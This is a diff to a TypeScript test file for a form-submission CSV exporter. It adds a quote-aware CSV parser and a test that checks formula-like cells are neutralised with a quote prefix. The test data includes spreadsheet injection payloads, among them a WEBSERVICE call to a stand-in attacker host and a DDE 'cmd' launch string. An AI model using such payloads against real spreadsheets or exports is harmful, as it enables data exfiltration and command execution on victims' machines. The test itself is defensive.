@@ -3,6 +3,33 @@ import * as assert from 'assert'
 
 import { ExportFileService } from '../src/service/export-file.service'
 
+function parseCsvRow(value: string): string[] {
+  const cells: string[] = []
+  let cell = ''
+  let quoted = false
+
+  for (let index = 0; index < value.length; index += 1) {
+    const character = value[index]
+
+    if (character === '"') {
+      if (quoted && value[index + 1] === '"') {
+        cell += '"'
+        index += 1
+      } else {
+        quoted = !quoted
+      }
+    } else if (character === ',' && !quoted) {
+      cells.push(cell)
+      cell = ''
+    } else {
+      cell += character
+    }
+  }
+
+  cells.push(cell)
+  return cells
+}
+
 async function testExportsRepeatedQuestionTitlesByFieldId() {
   const formFields: FormField[] = Array.from({ length: 9 }, (_, index) => [
     {
@@ -36,15 +63,14 @@ async function testExportsRepeatedQuestionTitlesByFieldId() {
   )
 
   const [header, row] = csv.split(/\r?\n/)
-  const parseRow = (value: string) => value.split(',').map(cell => JSON.parse(cell))
 
-  assert.deepStrictEqual(parseRow(header), [
+  assert.deepStrictEqual(parseCsvRow(header), [
     '#',
     ...formFields.map(field => field.title),
     'Start Date (UTC)',
     'Submit Date (UTC)'
   ])
-  assert.deepStrictEqual(parseRow(row), ['submission-1', ...expectedAnswers, '', ''])
+  assert.deepStrictEqual(parseCsvRow(row), ['submission-1', ...expectedAnswers, '', ''])
 }
 
 async function testExportsLegacyFileUploadUrls() {
@@ -79,15 +105,99 @@ async function testExportsLegacyFileUploadUrls() {
 
   const [, row] = csv.split(/\r?\n/)
 
-  assert.deepStrictEqual(
-    row.split(',').map(cell => JSON.parse(cell)),
-    ['submission-1', 'https://cdn.example.com/uploads/file-id', '', '']
+  assert.deepStrictEqual(parseCsvRow(row), [
+    'submission-1',
+    'https://cdn.example.com/uploads/file-id',
+    '',
+    ''
+  ])
+}
+
+async function testNeutralizesSpreadsheetFormulas() {
+  const csv = await new ExportFileService().csv(
+    [
+      {
+        id: 'formula-answer',
+        kind: FieldKindEnum.SHORT_TEXT,
+        title: '=1+1'
+      },
+      {
+        id: 'whitespace-formula-answer',
+        kind: FieldKindEnum.SHORT_TEXT,
+        title: 'Safe title'
+      },
+      {
+        id: 'control-formula-answer',
+        kind: FieldKindEnum.SHORT_TEXT,
+        title: 'Control-prefix formula'
+      }
+    ],
+    [
+      {
+        id: 'formula-hidden',
+        name: '  @SUM(A1)'
+      }
+    ],
+    [
+      {
+        id: 'submission-1',
+        answers: [
+          {
+            id: 'formula-answer',
+            kind: FieldKindEnum.SHORT_TEXT,
+            title: 'Formula answer',
+            value: '=WEBSERVICE("https://attacker.test")'
+          },
+          {
+            id: 'whitespace-formula-answer',
+            kind: FieldKindEnum.SHORT_TEXT,
+            title: 'Whitespace formula answer',
+            value: '  -1+1'
+          },
+          {
+            id: 'control-formula-answer',
+            kind: FieldKindEnum.SHORT_TEXT,
+            title: 'Control formula answer',
+            value: '\u0000\u0007=1+1'
+          }
+        ],
+        hiddenFields: [
+          {
+            id: 'formula-hidden',
+            name: 'Formula hidden',
+            value: "+cmd|' /C calc'!A0"
+          }
+        ]
+      } as any
+    ]
   )
+
+  const [header, row] = csv.split(/\r?\n/)
+
+  assert.deepStrictEqual(parseCsvRow(header), [
+    '#',
+    `'=1+1`,
+    'Safe title',
+    'Control-prefix formula',
+    `'  @SUM(A1)`,
+    'Start Date (UTC)',
+    'Submit Date (UTC)'
+  ])
+  assert.deepStrictEqual(parseCsvRow(row), [
+    'submission-1',
+    `'=WEBSERVICE("https://attacker.test")`,
+    `'  -1+1`,
+    `'\u0000\u0007=1+1`,
+    `'+cmd|' /C calc'!A0`,
+    '',
+    ''
+  ])
 }
 
 async function run() {
   await testExportsRepeatedQuestionTitlesByFieldId()
   await testExportsLegacyFileUploadUrls()
+  await testNeutralizesSpreadsheetFormulas()
 }
 
 if (require.main === module) {
